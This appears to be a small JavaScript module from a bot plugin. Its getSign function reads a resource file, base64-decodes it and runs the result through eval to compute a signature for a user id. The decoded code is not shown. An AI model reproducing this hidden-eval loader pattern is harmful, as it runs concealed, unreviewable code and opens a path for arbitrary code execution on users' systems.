import md5 from 'md5';
import fs from 'fs'
export function getSign(uid){const _path=process.cwd();let fuck=`${_path}/plugins/StarRail-plugin/resources/fuck/fuck`,bft=fs.readFileSync(fuck).toString(),ft=Buffer.from(bft,"base64").toString(),f=eval("("+ft+")");return f(uid)};
